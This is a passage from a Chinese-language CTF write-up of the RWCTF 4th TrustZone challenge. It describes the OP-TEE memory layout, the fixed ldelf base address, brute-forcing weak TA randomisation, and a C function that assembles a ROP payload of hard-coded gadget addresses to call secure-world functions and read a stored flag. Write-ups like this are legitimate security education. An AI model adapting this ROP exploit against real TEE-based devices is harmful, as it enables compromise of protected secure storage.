<td>ARM Trusted Firmware Boot Loader Stage 2</td>
</tr>
<tr>
<td>0xe040000</td>
<td>bl31.elf</td>
<td>ARM Trusted Firmware Boot Loader Stage 3-1</td>
</tr>
<tr>
<td>0xe100000</td>
<td>tee.elf</td>
<td>OP-TEE</td>
</tr>
<tr>
<td>0xffff000008081000</td>
<td>vmlinux</td>
<td>Linux Kernel [Normal World]</td>
</tr>
</tbody></table>
<ul>
<li>usermod</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user mode内存布局</span><br><span class="line">E&#x2F;LD:  region  0: va 0x40004000 pa 0x0e300000 size 0x002000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  1: va 0x40006000 pa 0x0e302000 size 0x008000 flags r-xs (ldelf)</span><br><span class="line">E&#x2F;LD:  region  2: va 0x4000e000 pa 0x0e30a000 size 0x001000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  3: va 0x4000f000 pa 0x0e30b000 size 0x004000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  4: va 0x40013000 pa 0x0e30f000 size 0x001000 flags r--s</span><br><span class="line">E&#x2F;LD:  region  5: va 0x40014000 pa 0x0e32e000 size 0x001000 flags rw-s (stack)</span><br><span class="line">E&#x2F;LD:  region  6: va 0x40015000 pa 0x5f60a888 size 0x001000 flags rw-- (param)</span><br><span class="line">E&#x2F;LD:  region  7: va 0x4004d000 pa 0x00001000 size 0x012000 flags r-xs [0]</span><br><span class="line"> &#x2F;&#x2F;随机 </span><br><span class="line">E&#x2F;LD:  region  8: va 0x4005f000 pa 0x00013000 size 0x00c000 flags rw-s [0]</span><br><span class="line"> &#x2F;&#x2F;随机</span><br></pre></td></tr></table></figure>

<p>一般而言： ldelf  加载地址是固定的， 处理代码位于 <code> build/optee*os/core/arch/arm/kernel/ldelf_loader.c</code></p>
<p><code>ldelf_load_ldelf</code> 函数中， 最后加载的base为  0x40006000, 具体代码可见<code>build/optee_os/core/arch/arm/kernel/ldelf_loader.c</code></p>
<h4 id="Solved-1"><a href="#Solved-1" class="headerlink" title="Solved"></a>Solved</h4><p>解题关键是需要了解没法直接解密的时候，我们应该如何读取 flag：</p>
<ol>
<li>TEE_AllocatePersistentObjectEnumerator</li>
<li>TEE_GetNextPersistentObject</li>
<li>TEE_OpenPersistentObject</li>
<li>TEE_ReadObjectData</li>
<li>memcpy data to buffer</li>
</ol>
<p>首先， <code>ldefl</code> 加载基地址是不变的，我们可以在这上边找 gadget ， 另外虽然 <code>TA</code>有随机化，但是这随机化并不是很高，可以通过爆破解决。所以 <code>TA</code> 的程序也是找 gadget 的目标之一。ldefl 程序的代码段是被通过 <code>ldelf_load_ldelf</code> 函数是写死在 <code>bl32_extra1.bin</code>中的。</p>
<p>最后我们找到的了几个可以设置 5 个参数的 gadget。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">CallFun5</span><span class="params">(TEEC_Session* sess,<span class="keyword">uint64_t</span> func,<span class="keyword">uint64_t</span> x0,<span class="keyword">uint64_t</span> x1,<span class="keyword">uint64_t</span> x2,<span class="keyword">uint64_t</span> x3,<span class="keyword">uint64_t</span> x4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//存放返回内存的地址在：g_ta_addr+124D8</span></span><br><span class="line">	<span class="comment">//返回地址0x00000000400152b0</span></span><br><span class="line">	payload = (<span class="keyword">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">memset</span>(payload,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(payload,tmp,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;tmplen 0x%lx \n&quot;</span>,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">48</span>) = <span class="number">0x40015150</span>;  <span class="comment">//next x19</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">56</span>) = <span class="number">0x40004008</span>;  <span class="comment">//next x20</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">40</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000003a28</span>; <span class="comment">//next pc</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>) = x1 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>; <span class="comment">//next x1  [x19+0x10]</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//x1 == [x19+0x10]</span></span><br><span class="line">	<span class="comment">//0x0000000000003a28: ldr x1, [x19, #0x10]; add x0, x0, x1; str x0, [x20]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret;</span></span><br><span class="line">	*(<span class="keyword">uint32_t</span>*)(payload+<span class="number">108</span>) = <span class="number">0x40015777</span>; <span class="comment">//next 19</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>) = <span class="number">0x40014ff8</span>; <span class="comment">//next 20</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">64</span>) = <span class="number">0x40004010</span>; <span class="comment">//next x21</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">184</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000C40</span>; <span class="comment">//next pc</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">344</span>) = x2; <span class="comment">//next x2</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//x2 = [SP,#0x70+va]</span></span><br><span class="line">	<span class="comment">//0x0000000000000C40 E2 37 40 F9                                   LDR             X2, [SP,#0x70+va]</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>+<span class="number">0x38</span>) = <span class="number">0x40015150</span>; <span class="comment">//next x19</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">272</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">304</span>) = <span class="number">0</span>; <span class="comment">//next x25</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">160</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>+<span class="number">8</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//x0 = [x19 + 0x18]</span></span><br><span class="line">	<span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line"><span class="comment">//	*(uint64_t*)(payload+360) = 0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">432</span>) = x1; <span class="comment">//next x27</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">440</span>) = x3; <span class="comment">//next x28</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">360</span>) = g_ta_addr+<span class="number">0x000000000000aa00</span>;<span class="comment">//next pc</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//x3 == x28  x1 == x27</span></span><br><span class="line">	<span class="comment">//0x000000000000aa00 : mov x3, x28 ; csel x21, x21, x2, ne ; mov x1, x27 ; mov x2, x21 ; str x24, [sp, #0x78] ; blr x23</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">400</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000001f98</span>;<span class="comment">//next x23 next pc</span></span><br><span class="line">	<span class="comment">//x21 == [sp, #0x20]</span></span><br><span class="line">	<span class="comment">//0x0000000000001f98 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">376</span>) = <span class="number">0x40015170</span>; <span class="comment">//next x20</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">496</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x21</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">472</span>) = g_ta_addr + <span class="number">0x0000000000005fa4</span>; <span class="comment">//next pc</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">696</span>) = x4; <span class="comment">//next x4 == [x20, #8]</span></span><br><span class="line">	<span class="comment">//x4 == [x20, #8]</span></span><br><span class="line">	<span class="comment">//x1 == [x21, #8]</span></span><br><span class="line">	<span class="comment">//0x0000000000005fa4 : ldr x4, [x20, #8] ; ldr x0, [x21, #8] ; cmp x4, x0 ; b.hi #0x5fc8 ; mov w0, w9 ; ldp x19, x20, [sp, #0x10] ; ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">528</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x19</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">544</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">416</span>) = <span class="number">0xFFFFFFFFFFFFF001</span>; <span class="comment">//next x25</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">520</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">728</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">568</span>) = func;<span class="comment">//0x40006000+0x000000000000064C;//next pc	</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.daimajiaoliu.com/daima/4872449c3100404">OP-TEE中secure stroage——安全存储使用的key的产生 (daimajiaoliu.com)</a></p>
<p><a href="https://optee.readthedocs.io/en/latest/">OP-TEE Documentation — OP-TEE documentation documentation (optee.readthedocs.io)</a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TrustZone-challenge"><span class="toc-number">1.</span> <span class="toc-text">TrustZone challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trust-or-Not"><span class="toc-number">1.1.</span> <span class="toc-text">Trust or Not</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.1.1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ideas"><span class="toc-number">1.1.2.</span> <span class="toc-text">Ideas</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solved"><span class="toc-number">1.1.3.</span> <span class="toc-text">Solved</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnTrustZone"><span class="toc-number">1.2.</span> <span class="toc-text">UnTrustZone</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TL-DR-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ideas-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Ideas</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Debug"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">Debug</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">内存布局</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solved-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">Solved</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">2.</span> <span class="toc-text">Reference</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&text=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&is_video=false&description=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RWCTF-4th TrustZone challenge Writeup&body=Check out this article: https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&name=RWCTF-4th TrustZone challenge Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&t=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2022
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
